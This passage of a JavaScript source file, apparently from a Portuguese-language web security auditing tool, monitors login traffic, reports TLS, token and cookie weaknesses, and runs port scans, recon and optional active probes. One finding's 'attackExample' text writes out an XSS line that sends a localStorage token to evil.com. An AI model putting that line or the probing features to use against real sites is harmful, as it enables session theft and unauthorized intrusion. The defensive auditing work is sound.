  ${routeRows ? `<table class="routes"><thead><tr><th>Método</th><th>Rota</th><th>Tipo</th><th>Fase</th><th>Auth</th></tr></thead><tbody>${routeRows}</tbody></table>` : ''}` : ''}

  ${tpRows ? `<h2>🏢 Terceiros (fora do seu controle)</h2>
  <p style="font-size:13px;color:#868e96">Bibliotecas/CDNs/domínios de terceiros. Você geralmente não pode corrigir — não entram na nota.</p>
  <table><thead><tr><th>Origem / Tipo</th><th style="text-align:center">Ocorrências</th></tr></thead><tbody>${tpRows}</tbody></table>` : ''}

  <footer>Gerado por Sentinela — Vulnerability Collector</footer>
</div></body></html>`;
}

// ─── Análise de TLS/Certificado (Tier 2) ──────────────────

function analyzeTLS(sec, url) {
  const findings = [];
  if (!sec) return findings;
  const proto = sec.protocol || '';

  // Protocolo obsoleto
  if (/TLS 1\.0|TLS 1\.1|SSL ?3|SSL ?2/i.test(proto)) {
    findings.push({
      type: 'weak_tls', severity: 'HIGH', thirdParty: false,
      label: `Protocolo TLS obsoleto (${proto})`, url,
      risk: `A conexão usa ${proto}, protocolo obsoleto e vulnerável (ex.: BEAST/POODLE). Pode permitir downgrade e interceptação.`,
      recommendation: 'Desabilitar TLS 1.0/1.1 no servidor. Exigir TLS 1.2+ (idealmente TLS 1.3).',
    });
  }

  const now = Date.now() / 1000;
  if (sec.validTo && sec.validTo < now) {
    findings.push({
      type: 'cert_expired', severity: 'HIGH', thirdParty: false,
      label: 'Certificado TLS expirado', url,
      risk: `O certificado expirou em ${new Date(sec.validTo * 1000).toISOString().slice(0, 10)}. Navegadores exibem alerta de segurança e a conexão pode ser considerada não confiável.`,
      recommendation: 'Renovar o certificado imediatamente. Configurar renovação automática (ex.: Let\'s Encrypt / certbot).',
    });
  } else if (sec.validTo && (sec.validTo - now) < 15 * 86400) {
    const days = Math.max(0, Math.floor((sec.validTo - now) / 86400));
    findings.push({
      type: 'cert_expiring', severity: 'MEDIUM', thirdParty: false,
      label: `Certificado TLS expira em ${days} dia(s)`, url,
      risk: `O certificado expira em ${days} dia(s) (${new Date(sec.validTo * 1000).toISOString().slice(0, 10)}). Se não renovado, o site ficará inacessível/inseguro.`,
      recommendation: 'Renovar antes do vencimento e configurar renovação automática + alerta.',
    });
  }

  // Certificado auto-assinado (issuer ausente ou == subject)
  if (!sec.issuer || (sec.subjectName && sec.issuer === sec.subjectName)) {
    findings.push({
      type: 'cert_self_signed', severity: 'MEDIUM', thirdParty: false,
      label: 'Certificado auto-assinado / CA não confiável', url,
      risk: 'O certificado parece ser auto-assinado (emissor não é uma CA pública). Navegadores mostram aviso e usuários se acostumam a ignorá-lo — abrindo espaço para ataques Man-in-the-Middle.',
      recommendation: 'Usar certificado de uma CA confiável (Let\'s Encrypt é gratuito). Para redes internas, distribuir uma CA corporativa nos dispositivos.',
    });
  }

  return findings;
}

// ─── Perguntas interativas de início ──────────────────────

function prompt(question) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(question, (ans) => { rl.close(); resolve((ans || '').trim()); });
  });
}

async function askStartupQuestions() {
  // Só pergunta em terminal interativo e se não foi definido por flag / --yes.
  if (assumeYes || !process.stdin.isTTY) {
    if (!scope) scope = shouldCrawl ? 'crawl' : 'single';
    return;
  }
  if (!scope) {
    console.log(chalk.cyan.bold('\n❓ Como você quer auditar este alvo?\n'));
    console.log('   1) Só a página de LOGIN (rápido — não precisa logar)');
    console.log('   2) Login + a página principal (padrão)');
    console.log('   3) NAVEGAÇÃO LIVRE — você navega por todas as páginas/botões e eu');
    console.log('      audito cada uma; quando terminar, aperte ENTER aqui');
    console.log('   4) Login + CRAWL automático (sigo os links internos sozinho)');
    const ans = await prompt(chalk.white('\n   Escolha [1-4] (padrão 2): '));
    scope = ({ 1: 'login', 2: 'single', 3: 'navigate', 4: 'crawl' })[ans] || 'single';
  }
  if (!activeMode && scope !== 'login') {
    const a = await prompt(chalk.white('   Rodar testes ATIVOS (métodos HTTP, .git/.env, security.txt)? Só com autorização do alvo [s/N]: '));
    activeMode = /^(s|y)/i.test(a);
  }
}

// ─── Issues do navegador (CDP Audits) ─────────────────────

function phaseTag() {
  return currentPhase === 'login' ? 'LOGIN' : currentPhase === 'pre-login' ? 'PRÉ-LOGIN' : 'PÓS-LOGIN';
}

// Só reportamos issues relevantes p/ segurança (o resto do painel é ruído de UX).
const BROWSER_ISSUE_MAP = {
  CookieIssue: { sev: 'MEDIUM', label: 'Problema de cookie (SameSite/atributos) — Chrome Issues' },
  MixedContentIssue: { sev: 'HIGH', label: 'Mixed content — detectado pelo navegador' },
  ContentSecurityPolicyIssue: { sev: 'MEDIUM', label: 'Violação de Content-Security-Policy' },
  CorsIssue: { sev: 'MEDIUM', label: 'Problema de CORS' },
  DeprecationIssue: { sev: 'LOW', label: 'API web deprecada em uso' },
  SharedArrayBufferIssue: { sev: 'LOW', label: 'SharedArrayBuffer sem isolamento (COOP/COEP)' },
  ClientHintIssue: { sev: 'LOW', label: 'Client Hints mal configurado' },
};

function issueToFinding(issue) {
  const map = BROWSER_ISSUE_MAP[issue.code];
  if (!map) return null; // ignora issues não relacionadas a segurança
  const details = issue.details || {};
  const dk = Object.keys(details)[0];
  const d = (dk && details[dk]) || {};
  let evidence = '';
  if (d.cookie && d.cookie.name) {
    const reasons = [...(d.cookieExclusionReasons || []), ...(d.cookieWarningReasons || [])];
    evidence = `cookie "${d.cookie.name}"${reasons.length ? ' — ' + reasons.join(', ') : ''}`;
  } else if (d.request && d.request.url) {
    evidence = d.request.url;
  } else if (d.violatedDirective) {
    evidence = `directive: ${d.violatedDirective}`;
  } else if (d.insecureURL) {
    evidence = d.insecureURL;
  } else if (d.type) {
    evidence = String(d.type);
  }
  const key = `${issue.code}|${evidence}`;
  if (seenBrowserIssue.has(key)) return null;
  seenBrowserIssue.add(key);
  // Se a evidência é uma URL, deixa `url` preenchido para a classificação
  // 1ª/3ª parte reclassificar (issues de vendor não devem contar na nota).
  const isUrl = /^https?:\/\//i.test(evidence);
  return {
    type: 'browser_issue', severity: map.sev, phase: phaseTag(),
    code: issue.code, label: map.label,
    currentValue: evidence || undefined,
    url: isUrl ? evidence : undefined,
    risk: `O próprio navegador (DevTools ▸ Issues) sinalizou: ${map.label}${evidence ? ` — ${evidence}` : ''}.`,
    recommendation: 'Abrir DevTools ▸ Issues para os detalhes e corrigir conforme o tipo (SameSite, CSP, mixed content, deprecação).',
  };
}

// ─── Main ──────────────────────────────────────────────────

async function main() {
  auditTimeline.length = 0;
  parseConfiguration();
  printBanner();

  console.log(chalk.white(`\n🎯 Alvo: ${chalk.cyan.bold(targetUrl)}`));

  await askStartupQuestions();

  const scopeLabels = { login: 'Só login', single: 'Login + página principal', navigate: 'Navegação livre (acompanhada)', crawl: 'Crawl automático' };
  console.log(chalk.white(`📂 Escopo: ${chalk.green(scopeLabels[scope] || scope)}${activeMode ? chalk.magenta(' + ATIVO') : ''}`));
  console.log(chalk.white(`⏱️  Timeout: ${loginTimeout / 1000}s`));

  // Iniciar Playwright com navegador do sistema (Edge) em janela InPrivate/limpa.
  // Cada execução usa perfil temporário isolado — sem cookies, histórico ou
  // sessão anteriores. O --inprivate reforça isso e deixa visível pro usuário.
  console.log(chalk.cyan('\n🚀 Abrindo navegador (Microsoft Edge — janela InPrivate/limpa)...'));
  const browser = await chromium.launch({
    headless: false,
    channel: 'msedge', // Usa o Edge instalado no sistema
    args: ['--start-maximized', '--inprivate'],
  });

  // Preparar caminho do HAR (export p/ Burp/ZAP + bodies como evidência).
  const reportsDir = join(dirname(__dirname), 'reports');
  if (!existsSync(reportsDir)) mkdirSync(reportsDir, { recursive: true });
  const sessionStamp = new Date().toISOString().replace(/[:.]/g, '-');
  const harPath = join(reportsDir, `session-${sessionStamp}.har`);

  const contextOptions = {
    viewport: null, // Usar tamanho da janela
    ignoreHTTPSErrors: true,
  };
  if (recordHar) contextOptions.recordHar = { path: harPath, content: 'embed' };

  const context = await browser.newContext(contextOptions);

  // Garantir estado zero (defensivo — o contexto já nasce isolado).
  try { await context.clearCookies(); } catch { /* ok */ }

  const page = await context.newPage();

  // Capturar console (erros/avisos) e exceções JS não tratadas.
  page.on('console', (msg) => {
    try {
      const t = msg.type();
      if (t === 'error' || t === 'warning') consoleMessages.push({ type: t, text: (msg.text() || '').slice(0, 300) });
    } catch { /* ignore */ }
  });
  page.on('pageerror', (err) => {
    try { pageErrors.push(String(err && err.message ? err.message : err).slice(0, 300)); } catch { /* ignore */ }
  });

  // CDP: painel Issues do DevTools (SameSite, CSP, mixed content, deprecações...).
  try {
    const cdp = await context.newCDPSession(page);
    await cdp.send('Audits.enable');
    cdp.on('Audits.issueAdded', (evt) => {
      try { const f = issueToFinding(evt.issue); if (f) browserIssues.push(f); } catch { /* ignore */ }
    });
  } catch { /* CDP indisponível — segue sem o painel Issues */ }

  // ══════════════════════════════════════════════════════════
  // Interceptar requisições de rede DESDE O INÍCIO
  // (captura tudo: pré-login, login e pós-login)
  // ══════════════════════════════════════════════════════════
  console.log(chalk.gray('  📡 Interceptando requisições de rede (todas as fases)...'));

  page.on('request', (request) => {
    try {
      const url = request.url();
      const method = request.method();
      const headers = request.headers();
      const postData = request.postData();

      // Tier 2: mixed content — página HTTPS carregando sub-recurso HTTP.
      if (pageOrigin.startsWith('https://') && url.startsWith('http://') &&
          !/^https?:\/\/(localhost|127\.0\.0\.1)/.test(url)) {
        let host = url;
        try { host = new URL(url).host; } catch { /* ignore */ }
        const rtype = request.resourceType();
        if (!mixedContentSeen.has(host)) {
          mixedContentSeen.add(host);
          const active = ['script', 'xhr', 'fetch', 'websocket', 'stylesheet'].includes(rtype);
          networkFindings.push({
            type: 'mixed_content',
            severity: active ? 'HIGH' : 'MEDIUM',
            thirdParty: false, // é a SUA página carregando recurso inseguro
            phase: currentPhase === 'login' ? 'LOGIN' : currentPhase === 'pre-login' ? 'PRÉ-LOGIN' : 'PÓS-LOGIN',
            label: `Mixed content (${rtype}) via HTTP`,
            url: `http://${host}`,
            resourceType: rtype,
            risk: active
              ? `Página HTTPS carrega um recurso ATIVO (${rtype}) via HTTP de ${host}. Um atacante na rede pode interceptar e injetar código malicioso, quebrando toda a proteção do HTTPS.`
              : `Página HTTPS carrega um recurso passivo (${rtype}) via HTTP de ${host}. Pode ser interceptado/alterado em trânsito e gera aviso de "não seguro" no navegador.`,
            recommendation: 'Servir TODOS os recursos via HTTPS. Adicionar Content-Security-Policy: upgrade-insecure-requests como reforço.',
          });
        }
      }

      // Inventário de rotas/endpoints (documentos, XHR/fetch e APIs) — para o
      // relatório detalhado. Ignora assets estáticos (img/css/font/media).
      try {
        const rtype = request.resourceType();
        if (['document', 'xhr', 'fetch'].includes(rtype)) {
          const u = new URL(url);
          const routeKey = `${method} ${u.host}${u.pathname}`;
          if (!seenRoutes.has(routeKey)) {
            seenRoutes.add(routeKey);
            // Para o inventário de rotas, "seu domínio" = mesmo domínio registrável
            // do alvo (inclui caminhos de plataforma tipo _hcms/mem no seu host).
            let sameDomain = false;
            try { sameDomain = sameRegistrableDomain(u.host, new URL(pageOrigin).host); } catch { /* ignore */ }
            const { vendor } = classifyResource(url, pageOrigin);
            capturedRoutes.push({
              method, kind: rtype, host: u.host, path: u.pathname,
              query: u.search ? u.search.replace(/((?:token|key|secret|password|passwd|auth|code|access_token|cpf|cnpj|email)=)[^&]+/gi, '$1***') : '',
              thirdParty: !sameDomain, vendor: sameDomain ? null : (vendor || null),
              phase: currentPhase === 'login' ? 'LOGIN' : currentPhase === 'pre-login' ? 'PRÉ-LOGIN' : 'PÓS-LOGIN',
              hasAuth: !!(headers['authorization'] || headers['Authorization']),
            });
          }
        }
      } catch { /* url inválida */ }

      // Inventário de assets 1ª parte (JS/CSS) para guessing de backup (.bak/.old...).
      try {
        const rt = request.resourceType();
        if ((rt === 'script' || rt === 'stylesheet')) {
          const u = new URL(url);
          if (sameRegistrableDomain(u.host, new URL(pageOrigin).host) && /\.(js|css)$/i.test(u.pathname) && !seenAssets.has(u.pathname)) {
            seenAssets.add(u.pathname);
            firstPartyAssets.push(u.origin + u.pathname);
          }
        }
      } catch { /* ignore */ }

      const reqData = { url, method, headers, postData, pageOrigin };
      const findings = analyzeRequest(reqData);

      // Adicionar tag de fase
      const taggedFindings = findings.map(f => ({ ...f, phase: currentPhase === 'login' ? 'LOGIN' : currentPhase === 'pre-login' ? 'PRÉ-LOGIN' : 'PÓS-LOGIN' }));

      // Durante o login, detectar envio de credenciais
      if (currentPhase === 'login') {
        // Detectar POST com senha
        if (method === 'POST' && postData) {
          const hasPassword = /password|passwd|senha|pwd/i.test(postData);
          if (hasPassword) {
            const isHttps = url.startsWith('https://');
            loginPhaseNetworkFindings.push({
              type: 'login_credentials_sent',
              severity: isHttps ? 'INFO' : 'CRITICAL',
              phase: 'LOGIN',
              label: isHttps ? 'Credenciais enviadas via HTTPS ✓' : 'Credenciais enviadas via HTTP (!)',
              url: url.split('?')[0], // Sem query params
              method,
              risk: isHttps
                ? 'Credenciais enviadas via POST sobre HTTPS. Adequado.'
                : 'CREDENCIAIS ENVIADAS SEM CRIPTOGRAFIA! Qualquer pessoa na rede pode interceptar usuário e senha.',
              recommendation: isHttps ? undefined : 'URGENTE: Implementar HTTPS.',
              note: `Login POST para: ${url.split('?')[0]}`,
            });

            // Verificar se a senha vai na query string
            if (url.includes('password=') || url.includes('passwd=') || url.includes('senha=')) {
              loginPhaseNetworkFindings.push({
                type: 'login_password_in_url',
                severity: 'CRITICAL',
                phase: 'LOGIN',
                label: 'Senha na URL (query string)!',
                url: url.split('?')[0],
                risk: 'Senha está na URL! Ficará salva no browser history, logs do servidor, proxy, analytics e header Referer.',
                recommendation: 'URGENTE: Enviar senha no body do POST, nunca na URL.',
              });
            }
          }
        }

        // Detectar tokens na URL durante login
        if (/token=|access_token=|code=|session_id=/i.test(url)) {
          loginPhaseNetworkFindings.push({
            type: 'login_token_in_url',
            severity: 'HIGH',
            phase: 'LOGIN',
            label: 'Token/código na URL durante login',
            url: url.split('?')[0],
            risk: 'Token de autenticação visível na URL. Pode vazar via Referer header, browser history e logs.',
            recommendation: 'Transmitir tokens via header Authorization ou body do POST.',
          });
        }
      }

      networkFindings.push(...taggedFindings);
    } catch {
      // Ignorar erros de interceptação
    }
  });

  page.on('response', async (response) => {
    try {
      const url = response.url();
      const status = response.status();
      const contentType = response.headers()['content-type'] || '';

      // Candidatos a IDOR/BOLA: GET, mesmo domínio, 200, com ID numérico na rota.
      // O teste em si só roda em modo --active (ver runIdorChecks).
      try {
        if (response.request().method() === 'GET' && status === 200 &&
            /application\/json|text\/html/i.test(contentType)) {
          const u = new URL(url);
          if (sameRegistrableDomain(u.host, new URL(pageOrigin).host) &&
              /(?:\/|=)(\d{1,12})(?:\/|$|&|\?|;)/.test(u.pathname + u.search)) {
            const key = u.pathname + u.search;
            if (!seenIdor.has(key) && idorCandidates.length < 25) {
              seenIdor.add(key);
              idorCandidates.push({ url });
            }
          }
        }
      } catch { /* ignore */ }

      // Analisar respostas JSON de APIs
      if (contentType.includes('application/json')) {
        try {
          const body = await response.text();
          const findings = analyzeResponse({ url, body });
          const taggedFindings = findings.map(f => ({ ...f, phase: currentPhase === 'login' ? 'LOGIN' : currentPhase === 'pre-login' ? 'PRÉ-LOGIN' : 'PÓS-LOGIN' }));
          networkFindings.push(...taggedFindings);

          // Durante o login, verificar o que a API retorna
          if (currentPhase === 'login' && body) {
            try {
              const parsed = JSON.parse(body);

              // API retorna token na resposta de login
              const tokenFields = ['token', 'accessToken', 'access_token', 'jwt', 'refreshToken', 'refresh_token', 'id_token', 'session_token'];
              for (const field of tokenFields) {
                if (parsed[field]) {
                  loginPhaseNetworkFindings.push({
                    type: 'login_token_in_response',
                    severity: 'HIGH',
                    phase: 'LOGIN',
                    label: `Token "${field}" retornado na resposta de login`,
                    url: url.split('?')[0],
                    tokenField: field,
                    tokenPreview: maskValue(String(parsed[field])),
                    risk: `A API retorna "${field}" no body da resposta. Se o frontend armazenar este token em localStorage/sessionStorage, ele fica vulnerável a XSS (roubo via script malicioso).`,
                    recommendation: 'Ideal: retornar tokens via Set-Cookie httpOnly (não acessível por JS). Se usar Bearer token, armazenar em memória (variável JS) e nunca em localStorage.',
                    attackExample: `Atacante injeta XSS → executa: fetch("https://evil.com/steal?token=" + localStorage.getItem("${field}")) → rouba a sessão do usuário.`,
                  });
                }
              }

              // API retorna dados do usuário com role/permissão
              const roleFields = ['role', 'roles', 'tipo', 'type', 'isAdmin', 'is_admin', 'permission', 'permissions', 'level', 'nivel'];
              for (const field of roleFields) {
                if (parsed[field] !== undefined || (parsed.user && parsed.user[field] !== undefined)) {
                  const value = parsed[field] || parsed.user?.[field];
                  loginPhaseNetworkFindings.push({
                    type: 'login_role_in_response',
                    severity: 'MEDIUM',
                    phase: 'LOGIN',
                    label: `Role/permissão "${field}" na resposta de login`,
                    url: url.split('?')[0],
                    field,
                    value: JSON.stringify(value),
                    risk: `A API retorna "${field}: ${JSON.stringify(value)}" na resposta de login. Se o frontend usar esse valor para controle de acesso (mostrar/esconder admin), o usuário pode alterá-lo via DevTools para escalar privilégios.`,
                    recommendation: 'Roles no frontend são APENAS para UX (renderização). O backend DEVE validar permissões em TODA requisição. O frontend pode usar roles para mostrar/esconder menu, mas nunca como barreira de acesso.',
                  });
                }
              }

              // API retorna senha do usuário (!!)
              if (parsed.password || parsed.passwd || parsed.senha || (parsed.user && (parsed.user.password || parsed.user.senha))) {
                loginPhaseNetworkFindings.push({
                  type: 'login_password_in_response',
                  severity: 'CRITICAL',
                  phase: 'LOGIN',
                  label: 'SENHA retornada na resposta de login!',
                  url: url.split('?')[0],
                  risk: 'A API RETORNA A SENHA DO USUÁRIO na resposta! Isso NUNCA deve acontecer. A senha pode ser capturada por qualquer script na página, logada em ferramentas de monitoramento, ou vista via DevTools.',
                  recommendation: 'URGENTE: Remover o campo de senha de TODAS as respostas da API. Senhas devem ser hasheadas (bcrypt/argon2) e NUNCA retornadas.',
                });
              }
            } catch {
              // Body não é JSON válido
            }
          }
        } catch {
          // Body não acessível
        }
      }

      // Coletar headers da resposta principal
      if (url === page.url()) {
        const headers = response.headers();
        const headerFindings = analyzeHeaders(headers, url);
        const taggedHeaderFindings = headerFindings.map(f => ({ ...f, phase: currentPhase === 'login' ? 'LOGIN' : currentPhase === 'pre-login' ? 'PRÉ-LOGIN' : 'PÓS-LOGIN' }));
        networkFindings.push(...taggedHeaderFindings);
      }

      // Durante login: detectar redirect com token na URL
      if (currentPhase === 'login' && (status === 301 || status === 302 || status === 303 || status === 307 || status === 308)) {
        const location = response.headers()['location'] || '';
        if (/token=|access_token=|code=|session_id=/i.test(location)) {
          loginPhaseNetworkFindings.push({
            type: 'login_redirect_with_token',
            severity: 'HIGH',
            phase: 'LOGIN',
            label: 'Redirect de login com token na URL',
            url: url.split('?')[0],
            redirectTo: location.split('?')[0],
            risk: 'Após login, o servidor redireciona com token na URL. O token ficará no browser history e pode vazar via Referer.',
            recommendation: 'Transmitir tokens via Set-Cookie ou fragment (#) ao invés de query string (?token=...).',
          });
        }
      }
    } catch {
      // Ignorar erros
    }
  });

  // ══════════════════════════════════════════════════════════
  //  FASE 1: PRÉ-LOGIN — Auditar a página de login
  // ══════════════════════════════════════════════════════════
  currentPhase = 'pre-login';
  auditTimeline.push({ time: new Date().toLocaleTimeString('pt-BR'), text: `Navegando para ${targetUrl}`, type: 'info' });

  console.log(chalk.cyan(`\n🌐 Navegando para ${targetUrl}...`));
  const navResponse = await page.goto(targetUrl, { waitUntil: 'networkidle', timeout: 30000 });

  // Capturar screenshot e HTML da primeira página
  try {
    const ssBuf = await page.screenshot({ fullPage: false });
    auditScreenshots.push({ url: page.url(), base64: ssBuf.toString('base64') });
    pageHtmlContent = await page.content();
  } catch { /* ignore */ }

  // Tier 2: inspecionar TLS/certificado da navegação principal.
  if (navResponse) {
    try {
      const sec = await navResponse.securityDetails();
      const tlsFindings = analyzeTLS(sec, targetUrl).map(f => ({ ...f, phase: 'PRÉ-LOGIN' }));
      if (tlsFindings.length > 0) {
        console.log(chalk.yellow(`  🔐 ${tlsFindings.length} achado(s) de TLS/certificado`));
        tlsFindings.forEach(logFinding);
        allFindings.push(...tlsFindings);
      } else if (sec) {
        console.log(chalk.gray(`  🔐 TLS OK: ${sec.protocol || '?'} — cert válido até ${sec.validTo ? new Date(sec.validTo * 1000).toISOString().slice(0, 10) : '?'}`));
      }
    } catch { /* http ou sem detalhes de segurança */ }
  }

  logPhaseHeader('PRÉ-LOGIN', '🔐', 'AUDITORIA DA PÁGINA DE LOGIN');
  console.log(chalk.gray('  Analisando a página de login ANTES de você digitar qualquer coisa...'));

  // Recon autônomo + Diagnóstico de Infraestrutura (rodando EM PARALELO)
  console.log(chalk.gray('  🛰️  Recon autônomo + Diagnóstico de infraestrutura em paralelo...'));
  
  const targetHost = new URL(targetUrl).hostname;

  const reconPromise = runRecon(context.request, pageOrigin, { active: activeMode })
    .catch(err => { console.log(chalk.gray(`  (recon falhou: ${err.message})`)); return { findings: [], candidatePaths: [], anonResults: {} }; });

  const infraPromise = (async () => {
    try {
      console.log(chalk.gray('  🔌 Escaneando portas TCP, registros DNS, socket timing, GeoIP e reputação...'));
      const timing = await measureSocketTiming(targetUrl).catch(() => ({ status: 'FAIL' }));
      const ip = timing.ip || '';
      
      const [tcpScan, geoip, reputation, loadPercentiles, dnsSecurity] = await Promise.all([
        scanTcpPorts(targetHost).catch(() => ({ ports: [], findings: [] })),
        lookupGeoIP(ip).catch(() => ({ status: 'INFO' })),
        checkDnsblReputation(ip, targetHost).catch(() => ({ is_blacklisted: false, findings: [] })),
        measureLoadPercentiles(targetUrl, 10, 5).catch(() => ({ percentiles: null })),
        analyzeDnsSecurity(targetUrl).catch(() => ({ status: 'INFO', records: {}, findings: [] })),
      ]);

      const socialCards = analyzeSocialCards(pageHtmlContent, targetUrl);

      return {
        socketTiming: timing,
        tcpScan,
        geoip,
        reputation,
        loadPercentiles,
        socialCards,
        dnsSecurity,
      };
    } catch (e) {
      console.log(chalk.gray(`  (infra check falhou: ${e.message})`));
      return null;
    }
  })();

  // Auditar a página de login (roda concorrente ao recon/infra)
  const loginPageFindings = await auditLoginPage(page, page.url());
  allFindings.push(...loginPageFindings);
  visitedUrls.add(page.url());

  // Colher o resultado do recon e infra
  const recon = await reconPromise;
  reconCandidatePaths = recon.candidatePaths || [];
  anonProbeResults = recon.anonResults || {};
  if (recon.findings && recon.findings.length > 0) {
    console.log(chalk.yellow(`  🛰️  Recon autônomo: ${recon.findings.length} achado(s)`));
    recon.findings.forEach(logFinding);
    allFindings.push(...recon.findings.map(f => ({ ...f, phase: f.phase || 'PRÉ-LOGIN' })));
  }

  infraData = await infraPromise;
  if (infraData) {
    if (infraData.tcpScan?.findings?.length > 0) {
      const tcpFindings = infraData.tcpScan.findings.map(f => ({ ...f, phase: 'PRÉ-LOGIN' }));
      tcpFindings.forEach(logFinding);
      allFindings.push(...tcpFindings);
    }
    if (infraData.reputation?.findings?.length > 0) {
      const repFindings = infraData.reputation.findings.map(f => ({ ...f, phase: 'PRÉ-LOGIN' }));
      repFindings.forEach(logFinding);
      allFindings.push(...repFindings);
    }
    if (infraData.dnsSecurity?.findings?.length > 0) {
      const dnsFindings = infraData.dnsSecurity.findings.map(f => ({ ...f, phase: 'PRÉ-LOGIN' }));
      dnsFindings.forEach(logFinding);
      allFindings.push(...dnsFindings);
    }
    addTimeline(`Varredura de infraestrutura e recon concluídos: IP ${infraData.geoip?.ip || '?'}, ${infraData.tcpScan?.open_count || 0} portas abertas, timing ${infraData.socketTiming?.total_ms || 0}ms.`);
    console.log(chalk.green(`  🏗️ Infraestrutura auditada: IP ${infraData.geoip?.ip || '?'}, ${infraData.tcpScan?.open_count || 0} portas abertas, timing ${infraData.socketTiming?.total_ms || 0}ms`));
  }

  // Tirar snapshot ANTES do login
  console.log(chalk.gray('\n  📸 Snapshot do storage ANTES do login...'));
  storageSnapshotBefore = await takeStorageSnapshot(page);
  cookieSnapshotBefore = await takeCookieSnapshot(page);

  const lsBefore = Object.keys(storageSnapshotBefore.localStorage).length;
  const ssBefore = Object.keys(storageSnapshotBefore.sessionStorage).length;
  const cookiesBefore = cookieSnapshotBefore.length;
  console.log(chalk.gray(`  📦 Estado atual: localStorage(${lsBefore} chaves), sessionStorage(${ssBefore} chaves), cookies(${cookiesBefore})`));

  // ══════════════════════════════════════════════════════════
  //  FASE 2: LOGIN — Monitorar enquanto o usuário faz login
  //  (pulada quando o escopo é só 'login')
  // ══════════════════════════════════════════════════════════
  let storageSnapshotAfter = storageSnapshotBefore;
  let cookieSnapshotAfter = cookieSnapshotBefore;
  let stopLiveAuditor = null;

  if (scope === 'login') {
    console.log(chalk.yellow('\n  ⏭️  Escopo "só login": pulando o login e gerando o relatório da tela de login.'));
  } else {
  currentPhase = 'login';

  logPhaseHeader('LOGIN', '🔄', 'MONITORAMENTO EM TEMPO REAL');
  if (scope === 'navigate') {
    console.log(chalk.green.bold(`
╔════════════════════════════════════════════════════════════╗
║   🧭 NAVEGAÇÃO LIVRE — audito CADA página que você abrir   ║
║                                                            ║
║   Faça login e navegue por TODAS as páginas e botões que   ║
║   quiser. Cada página nova é auditada automaticamente.     ║
║                                                            ║
║   ⚡ Rede, respostas de API, tokens e rotas: monitorados.   ║
║                                                            ║
║   COMO PARA:                                               ║
║    • Aperte ENTER aqui a qualquer momento, OU              ║
║    • Paro sozinho após ${String(Math.round(navIdleMs / 1000)).padEnd(3)}s SEM abrir página nova.        ║
╚════════════════════════════════════════════════════════════╝
`));
    console.log(chalk.gray(`  (dica: ajuste a inatividade com --idle N, em segundos)`));
    stopLiveAuditor = startLivePageAuditor(page);
  } else {
    console.log(chalk.green.bold(`
╔════════════════════════════════════════════════════════════╗
║   👤 FAÇA LOGIN NO NAVEGADOR AGORA                         ║
║                                                            ║
║   O navegador está aberto. Faça login normalmente          ║
║   (incluindo 2FA se necessário).                           ║
║                                                            ║
║   ⚡ Rede, respostas de API e redirects: monitorados.       ║
║                                                            ║
║   Ao cair na página principal ele avança sozinho, ou       ║
║   VOLTE AQUI e pressione ENTER.                            ║
╚════════════════════════════════════════════════════════════╝
`));
  }

  // Aguardar login. Avança quando:
  //   (1) o usuário aperta ENTER no terminal (modo manual), OU
  //   (2) detecta automaticamente que saiu da tela de login (modo automático), OU
  //   (3) atinge o timeout máximo (rede de segurança).
  const loginStartUrl = page.url();
  const isLoginLikeUrl = (u) => {
    try {
      const url = new URL(u);
      return /login|signin|sign-in|register|signup|sign-up|cadastro|_hcms\/mem|auth|sso|2fa|otp|mfa|challenge|verify|realms/i.test(url.pathname + url.search);
    } catch {
      return true;
    }
  };
  // No modo navegação livre NÃO há auto-avanço: você termina apertando ENTER
  // (ou pelo timeout). Nos outros modos, avança sozinho ao sair da tela de login.
  const autoAdvance = scope !== 'navigate';
  await new Promise((resolve) => {
    let done = false;
    let stableTicks = 0;
    const finish = (reason) => {
      if (done) return;
      done = true;
      clearInterval(poller);
      clearTimeout(maxTimer);
      try { process.stdin.pause(); } catch {}
      addTimeline(`Finalização da coleta de dados (${reason}). Compilando relatórios empresariais...`);
      console.log(chalk.green(`\n  ▶️  Finalizando coleta (${reason}).`));
      resolve();
    };

    // Gatilho 1: ENTER no terminal (quando rodando interativamente)
    try {
      process.stdin.setRawMode?.(false);
      process.stdin.resume();
      process.stdin.once('data', () => finish('ENTER pressionado'));
    } catch { /* stdin indisponível — segue no modo automático */ }

    // Gatilho 2: poller a cada 1.5s
    const poller = setInterval(() => {
      // Modo navegação: NÃO finaliza automaticamente por inatividade nem por redirect.
      // O usuário navega livremente até clicar em "Finalizar" no control server
      // ou rodar `node sentinela.mjs done` (que invoca finalizePromise).
      if (scope === 'navigate') {
        return;
      }
      // Demais modos: auto-detecção de saída da tela de login.
      if (!autoAdvance) return;
      let current;
      try { current = page.url(); } catch { return; }
      if (current && current !== loginStartUrl && !isLoginLikeUrl(current)) {
        stableTicks++;
        if (stableTicks >= 3) finish('login detectado automaticamente');
      } else {
        stableTicks = 0;
      }
    }, 1500);

    // Gatilho 3: teto absoluto de segurança. Na navegação é bem alto (3h) para
    // nunca cortar você no meio; nos outros modos é o loginTimeout (5min padrão).
    const absoluteCap = scope === 'navigate' ? 3 * 60 * 60 * 1000 : loginTimeout;
    const maxTimer = setTimeout(() => finish('teto de tempo atingido'), absoluteCap);
  });

  if (stopLiveAuditor) stopLiveAuditor();

  // Tirar snapshot DEPOIS do login
  console.log(chalk.gray('\n  📸 Snapshot do storage DEPOIS do login...'));
  storageSnapshotAfter = await takeStorageSnapshot(page);
  cookieSnapshotAfter = await takeCookieSnapshot(page);

  const lsAfter = Object.keys(storageSnapshotAfter.localStorage).length;
  const ssAfter = Object.keys(storageSnapshotAfter.sessionStorage).length;
  const cookiesAfter = cookieSnapshotAfter.length;
  console.log(chalk.gray(`  📦 Estado atual: localStorage(${lsAfter} chaves), sessionStorage(${ssAfter} chaves), cookies(${cookiesAfter})`));

  // Comparar before/after
  console.log(chalk.cyan('\n  🔀 Comparando estado ANTES vs DEPOIS do login...'));

  const lsDiff = diffSnapshots(storageSnapshotBefore.localStorage, storageSnapshotAfter.localStorage, 'localStorage');
  const ssDiff = diffSnapshots(storageSnapshotBefore.sessionStorage, storageSnapshotAfter.sessionStorage, 'sessionStorage');
  const cookieDiff = diffCookies(cookieSnapshotBefore, cookieSnapshotAfter);

  const allDiffs = [...lsDiff, ...ssDiff, ...cookieDiff];

  // Tier 3: session fixation — cookie de sessão manteve o MESMO valor após login.
  const sessionRe = /sess|sid|token|auth|jwt|hsmem|jsessionid|phpsessid|asp\.?net/i;
